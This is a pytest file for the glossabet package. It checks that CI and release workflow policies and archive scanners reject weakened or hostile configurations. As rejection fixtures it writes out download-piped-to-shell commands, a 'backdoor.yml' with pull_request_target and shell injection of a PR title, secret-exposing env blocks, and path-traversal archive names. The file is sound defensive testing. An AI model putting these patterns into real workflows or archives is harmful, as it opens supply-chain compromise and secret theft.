"""Release automation stays full-matrix, manual, and metadata-consistent."""

from pathlib import Path

import pytest

from glossabet import __version__
from scripts.check_workflows import check_workflows, validate_workflow_texts

ROOT = Path(__file__).resolve().parents[1]


def test_release_metadata_matches_package_version_and_supported_pythons():
    pyproject = (ROOT / "pyproject.toml").read_text(encoding="utf-8")
    init = (ROOT / "glossabet" / "__init__.py").read_text(encoding="utf-8")
    assert f'__version__ = "{__version__}"' in init
    for minor in range(10, 15):
        assert f'"Programming Language :: Python :: 3.{minor}"' in pyproject
    assert 'requires-python = ">=3.10"' in pyproject
    assert 'requires = ["hatchling>=1.32,<1.33"]' in pyproject
    assert "dependencies =" not in pyproject
    assert 'dev = ["pytest"]' in pyproject


def _workflow_texts() -> dict[str, str]:
    directory = ROOT / ".github" / "workflows"
    return {
        name: (directory / name).read_text(encoding="utf-8")
        for name in ("quality.yml", "ci.yml", "release.yml")
    }


def test_reusable_quality_gate_controls_ci_and_release():
    assert check_workflows() == []
    attributes = (ROOT / ".gitattributes").read_text(encoding="utf-8")
    assert "* text=auto eol=lf" in attributes


def test_workflow_policy_rejects_meaningful_gate_weakening():
    originals = _workflow_texts()
    mutations = [
        (
            "quality.yml",
            "os: [ubuntu-latest, macos-latest, windows-latest]",
            "os: [ubuntu-latest, macos-latest]",
        ),
        (
            "quality.yml",
            'python-version: ["3.10", "3.11", "3.12", "3.13", "3.14"]',
            'python-version: ["3.11", "3.12", "3.13", "3.14"]',
        ),
        ("quality.yml", "needs: test", "needs: []"),
        (
            "ci.yml",
            "uses: ./.github/workflows/quality.yml",
            "uses: ./.github/workflows/bypass.yml",
        ),
        (
            "release.yml",
            "uses: ./.github/workflows/quality.yml",
            "uses: ./.github/workflows/bypass.yml",
        ),
        ("release.yml", "needs: quality", "needs: []"),
        (
            "release.yml",
            "inputs.confirmation == 'publish-glossabet-to-pypi'",
            "inputs.confirmation != ''",
        ),
        (
            "release.yml",
            "python evaluation/run.py --verify-results evaluation/results.json --current",
            "python -c pass",
        ),
        (
            "quality.yml",
            "python scripts/agent_eval.py --verify-results evaluation/agent-results.json",
            "python -c pass",
        ),
        (
            "release.yml",
            "python evaluation/review.py --verify-results evaluation/reviewer-results.json --current",
            "python -c pass",
        ),
        (
            "release.yml",
            "python scripts/agent_eval.py --verify-results evaluation/agent-results.json --current",
            "python scripts/agent_eval.py --verify-results evaluation/agent-results.json",
        ),
        (
            "quality.yml",
            "python scripts/build_plugin.py dist",
            "python -c pass",
        ),
        (
            "release.yml",
            "git diff --exit-code -- plugins/glossabet",
            "git status --short",
        ),
        (
            "release.yml",
            'python scripts/check_distribution.py dist --tag "$RELEASE_TAG" --current',
            'python scripts/check_distribution.py dist --tag "$RELEASE_TAG"',
        ),
        (
            "release.yml",
            "python scripts/build_plugin.py dist",
            "python -c pass",
        ),
        (
            "release.yml",
            "pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33",
            "pypa/gh-action-pypi-publish@v1",
        ),
        # The peripheral rules a test-audit found unpinned: each is a way
        # the gate could be widened or the release made non-manual.
        ("quality.yml", "on:\n  workflow_call:", "on:\n  workflow_call:\n  push:"),
        ("quality.yml", "on:\n  workflow_call:", "on:\n  push:"),
        ("quality.yml", "      fail-fast: false", "      fail-fast: true"),
        ("quality.yml", "      - run: python scripts/check_workflows.py",
         "      - run: python scripts/check_workflows.py --current"),
        ("ci.yml", "    uses: ./.github/workflows/quality.yml",
         "    uses: ./.github/workflows/quality.yml\n    run: echo shortcut"),
        ("release.yml", "on:\n  workflow_dispatch:", "on:\n  push:\n  workflow_dispatch:"),
        ("release.yml", "on:\n  workflow_dispatch:", "on:\n  push:"),
        ("release.yml", "  quality:\n    uses: ./.github/workflows/quality.yml",
         "  quality:\n    if: false\n    uses: ./.github/workflows/quality.yml"),
        ("release.yml", "      id-token: write", "      id-token: write\n      packages: write"),
        ("release.yml", "    permissions:\n      contents: read\n      id-token: write",
         "    permissions: write-all"),
        ("release.yml", "  publish:\n    needs: quality",
         "  publish:\n    needs: quality\n    env:\n      TOKEN: ${{ secrets.PYPI_TOKEN }}"),
        ("release.yml", "pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33 # v1.14.2\n",
         "pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33 # v1.14.2\n"
         "  extra:\n    runs-on: ubuntu-latest\n    steps: []\n"),
        ("ci.yml", "    uses: ./.github/workflows/quality.yml\n",
         "    uses: ./.github/workflows/quality.yml\n  extra:\n    runs-on: ubuntu-latest\n    steps: []\n"),
        ("release.yml", "on:\n  workflow_dispatch:\n    inputs:\n      confirmation:\n        description: Type publish-glossabet-to-pypi to authorize the public upload\n        required: true\n        type: string\n",
         "on: {}\n"),
        ("quality.yml", "\n  package:\n",
         "\n  extra:\n    runs-on: ubuntu-latest\n    steps: []\n  package:\n"),
        ("release.yml", "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
         "      - uses: "),
        # A required step present as text but inert: its failure discarded
        # by a shell softener, by continue-on-error, or by a step-level if.
        ("quality.yml", "      - run: uv run --locked pytest -q",
         "      - run: uv run --locked pytest -q || true"),
        ("quality.yml", "      - run: uv run --locked pytest -q",
         "      - run: uv run --locked pytest -q || exit 0"),
        ("quality.yml", "      - run: uv run --locked pytest -q",
         "      - run: uv run --locked pytest -q || :"),
        ("quality.yml", "      - run: uv run --locked pytest -q",
         "      - run: |\n          set +e\n          uv run --locked pytest -q"),
        ("quality.yml", "      - run: uv run --locked pytest -q",
         "      - run: uv run --locked pytest -q\n        continue-on-error: true"),
        ("quality.yml", "      - run: uv run --locked pytest -q",
         "      - run: uv run --locked pytest -q\n        if: false"),
        ("release.yml", "      - run: python scripts/wheel_smoke.py dist",
         "      - run: python scripts/wheel_smoke.py dist\n        continue-on-error: true"),
        # A stored secret reachable by every job through a top-level env.
        ("release.yml", "permissions:\n  contents: read\n",
         "env:\n  TOKEN: ${{ secrets.PYPI_TOKEN }}\npermissions:\n  contents: read\n"),
    ]

    for filename, original, weakened in mutations:
        assert original in originals[filename]
        workflows = dict(originals)
        workflows[filename] = workflows[filename].replace(
            original, weakened, 1
        )
        assert validate_workflow_texts(workflows), (
            f"workflow policy accepted weakening in {filename}: {weakened}"
        )


def test_distribution_content_guard_catches_local_home_paths():
    from scripts.check_distribution import _LOCAL_PATH_RE

    # Build the samples from parts so this test file itself carries no
    # contiguous home-path literal that would trip the guard when tests/
    # ships in the sdist.
    posix = b"trace " + b"/home/" + b"alice/Projects/x"
    windows = b"C:" + b"\\Users\\" + b"dev\\proj"
    root_home = b"trace " + b"/roo" + b"t/.local/bin/glossabet"
    assert _LOCAL_PATH_RE.search(posix)
    assert _LOCAL_PATH_RE.search(windows)
    # the superuser home directory (root's) must also be caught
    assert _LOCAL_PATH_RE.search(root_home)
    # ...but an ordinary nested directory of that name must not false-positive
    assert not _LOCAL_PATH_RE.search(b"/usr/" + b"roo" + b"t/share")
    # the guard's own pattern source must not be a self-match
    assert not _LOCAL_PATH_RE.search(b"(?:/home/|/Users/)[literal]")


def test_workflow_policy_ignores_comments_and_checks_every_workflow_file(tmp_path):
    """The checker was a substring matcher: every required step present only
    inside `#` comments passed, an unpinned action or `pull_request_target`
    in a fourth file was never read, and an expression interpolated into a
    shell line went unnoticed. Comments are stripped first, every file in
    the directory is held to the global rules, and the publish job's tag must
    arrive through `env:`."""
    from scripts.check_workflows import check_workflows, validate_workflow_texts

    workflows = {
        path.name: path.read_text(encoding="utf-8")
        for path in (ROOT / ".github" / "workflows").iterdir()
        if path.suffix == ".yml"
    }
    assert validate_workflow_texts(workflows) == []

    # Guards and steps moved into comments no longer satisfy the checker.
    commented = dict(workflows)
    commented["release.yml"] = "\n".join(
        ("# " + line if "startsWith(github.ref_name, 'v')" in line else line)
        for line in workflows["release.yml"].splitlines()
    )
    assert any("publish guard is missing" in e for e in validate_workflow_texts(commented))

    # Interpolating the tag straight into the shell line is refused.
    inline = dict(workflows)
    inline["release.yml"] = workflows["release.yml"].replace(
        '--tag "$RELEASE_TAG"', '--tag "${{ github.ref_name }}"'
    )
    assert any("untrusted expression outside env:/if:" in e for e in validate_workflow_texts(inline))

    # A fourth workflow file is read: fork-PR trigger, tag-pinned action, and
    # an event expression in a run line are all reported.
    extra = dict(workflows)
    extra["backdoor.yml"] = (
        "on:\n  pull_request_target:\njobs:\n  x:\n    runs-on: ubuntu-latest\n"
        "    steps:\n      - uses: actions/checkout@v4\n"
        "      - run: echo ${{ github.event.pull_request.title }}\n"
        "      - run: curl -sSf https://x/install.sh | sh\n"
    )
    errors = validate_workflow_texts(extra)
    assert any("pull_request_target" in e for e in errors)
    assert any("unpinned action" in e for e in errors)
    assert any("untrusted expression" in e for e in errors)
    assert any("pipes a download" in e for e in errors)

    # The bypasses a fix-review found against the first hardening: an
    # expression on line 2 of a `run: |` block, a `#` inside a quoted string
    # before the expression, list/flow/bare spellings of the fork trigger, a
    # `uses:` target on a continuation line, and dropped publish hardening.
    for text, expected in (
        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
         "      - run: |\n          echo hi\n          echo ${{ github.event.issue.title }}\n",
         "untrusted expression"),
        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
         "      - run: echo \"a #\" ${{ github.event.issue.title }}\n",
         "untrusted expression"),
        ("on: [pull_request_target]\njobs: {}\n", "pull_request_target"),
        ("on: pull_request_target\njobs: {}\n", "pull_request_target"),
        ("on: {pull_request_target: {}}\njobs: {}\n", "pull_request_target"),
        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
         "      - uses:\n          actions/checkout@v4\n", "unpinned action"),
        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
         "      - uses: actions/github-script@0123456789abcdef0123456789abcdef01234567\n"
         "        with:\n          script: return context.payload.pull_request.title\n"
         "      - uses: x/y@0123456789abcdef0123456789abcdef01234567\n"
         "        with:\n          arg: ${{ github.event.pull_request.title }}\n",
         "untrusted expression"),
        # Wrapped in a function call, the value is still the attacker's.
        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
         "      - run: echo ${{ toJSON(github.event.pull_request) }}\n",
         "untrusted expression"),
        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
         "      - run: echo ${{ format('{0}', inputs.name) }}\n",
         "untrusted expression"),
        # The whole event object (title, body, branch names inside).
        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
         "      - uses: x/y@0123456789abcdef0123456789abcdef01234567\n"
         "        with:\n          a: ${{ toJSON(github.event) }}\n",
         "untrusted expression"),
        # A download piped through sudo or env into a shell.
        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
         "      - run: curl -sSf https://x/i.sh | sudo bash\n", "pipes a download"),
        ("on: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
         "      - run: wget -qO- https://x/i.sh | env FOO=1 sh -s\n", "pipes a download"),
        # A stored secret in any workflow, at any level.
        ("on: push\nenv:\n  T: ${{ secrets.TOKEN }}\njobs: {}\n", "stored secret"),
    ):
        variant = dict(workflows)
        variant["extra.yml"] = text
        assert any(expected in e for e in validate_workflow_texts(variant)), (expected, text)
    weakened = dict(workflows)
    weakened["release.yml"] = workflows["release.yml"].replace(
        "          persist-credentials: false\n", ""
    )
    assert any("persist credentials" in e for e in validate_workflow_texts(weakened))
    weakened["release.yml"] = workflows["release.yml"].replace(
        "      id-token: write\n", "      id-token: write\n      packages: write\n"
    )
    assert any("not exactly contents: read" in e for e in validate_workflow_texts(weakened))

    # And check_workflows() reads the whole directory, not three fixed names.
    for name, text in extra.items():
        (tmp_path / name).write_text(text, encoding="utf-8")
    assert check_workflows(tmp_path)
    (tmp_path / "backdoor.yml").unlink()
    assert check_workflows(tmp_path) == []


def test_distribution_home_path_scan_reaches_every_archive_layer(tmp_path, monkeypatch):
    """The regex alone is not the guard: the wheel scan must read every
    wheel member, the sdist scan every tar member, and a wheel *nested*
    inside the sdist (the plugin's bundled asset) must be opened and each
    of its members scanned — its bytes are compressed, so the outer scan
    cannot see them. A member declaring more than the nested-inflate bound
    is refused, not inflated."""
    import io
    import tarfile
    import zipfile

    from scripts import check_distribution as dist

    home = b"/home/" + b"alice/Projects/x"  # assembled: no literal in this file

    def wheel_bytes(payload: bytes, name: str = "glossabet/leak.txt") -> bytes:
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("glossabet/__init__.py", "x = 1\n")
            archive.writestr(name, payload)
        return buffer.getvalue()

    # A wheel member leaking a home path fails the wheel check by name.
    wheel = tmp_path / "glossabet-0.0.0-py3-none-any.whl"
    wheel.write_bytes(wheel_bytes(b"trace " + home))
    with pytest.raises(SystemExit) as info:
        dist._check_wheel(wheel, "0.0.0", b"")
    assert "leaks a local home path" in str(info.value)
    assert "glossabet/leak.txt" in str(info.value)

    # A wheel nested in the sdist: the leak sits only inside the inner zip.
    inner = wheel_bytes(b"trace " + home, "glossabet/inner.txt")
    sdist = tmp_path / "glossabet-0.0.0.tar.gz"
    with tarfile.open(sdist, "w:gz") as archive:
        info_ = tarfile.TarInfo(
            "glossabet-0.0.0/plugins/glossabet/skills/glossabet/assets/"
            "glossabet-0.0.0-py3-none-any.whl"
        )
        info_.size = len(inner)
        archive.addfile(info_, io.BytesIO(inner))
    with pytest.raises(SystemExit) as info:
        dist._check_sdist(sdist, wheel, "0.0.0", b"", current=False)
    assert "leaks a local home path" in str(info.value)
    assert "!glossabet/inner.txt" in str(info.value)

    # The per-member inflate bound refuses an over-declared member.
    monkeypatch.setattr(dist, "_MAX_NESTED_MEMBER_BYTES", 8)
    with pytest.raises(SystemExit) as info:
        dist._check_no_local_paths_in_zip(wheel_bytes(b"0123456789"), "asset.whl", "sdist")
    assert "refusing to inflate" in str(info.value)


def test_plugin_smoke_sdist_extraction_refuses_unsafe_members_and_extracts_safe_ones(tmp_path):
    """The temporary Codex lifecycle probe extracts the sdist it just built.
    Extraction must refuse absolute (POSIX or Windows), backslashed, or
    parent-escaping member names, links and devices, and dotenv paths — and
    must actually run on a well-formed archive (a bughunt found the guard
    referenced an undefined name, so the probe crashed on its first member)."""
    import io
    import tarfile

    from scripts import plugin_smoke

    def sdist_with(*names: str, kind: str = "file") -> Path:
        archive_path = tmp_path / f"{abs(hash(names))}.tar.gz"
        with tarfile.open(archive_path, "w:gz") as archive:
            info = tarfile.TarInfo("glossabet-0.0.0/README.md")
            info.size = 2
            archive.addfile(info, io.BytesIO(b"ok"))
            for name in names:
                member = tarfile.TarInfo(name)
                if kind == "symlink":
                    member.type = tarfile.SYMTYPE
                    member.linkname = "README.md"
                else:
                    member.size = 1
                archive.addfile(member, None if kind == "symlink" else io.BytesIO(b"x"))
        return archive_path

    root = plugin_smoke._extract_sdist(sdist_with("glossabet-0.0.0/src/a.py"), tmp_path / "ok")
    assert root == tmp_path / "ok" / "glossabet-0.0.0"
    assert (root / "src" / "a.py").read_bytes() == b"x"

    for name, expected in (
        ("/etc/passwd", "unsafe path"),
        ("C:/Windows/x", "unsafe path"),
        ("C:\\Windows\\x", "unsafe path"),
        ("\\\\server\\share\\x", "unsafe path"),
        ("glossabet-0.0.0/../escape.py", "unsafe path"),
        ("glossabet-0.0.0/sub\\dir/x", "unsafe path"),
        ("glossabet-0.0.0/.env", "forbidden dotenv path"),
        ("glossabet-0.0.0/config/.env.local", "forbidden dotenv path"),
    ):
        with pytest.raises(RuntimeError) as info:
            plugin_smoke._extract_sdist(sdist_with(name), tmp_path / "bad")
        assert expected in str(info.value), name
    with pytest.raises(RuntimeError) as info:
        plugin_smoke._extract_sdist(
            sdist_with("glossabet-0.0.0/link", kind="symlink"), tmp_path / "link"
        )
    assert "link/device" in str(info.value)
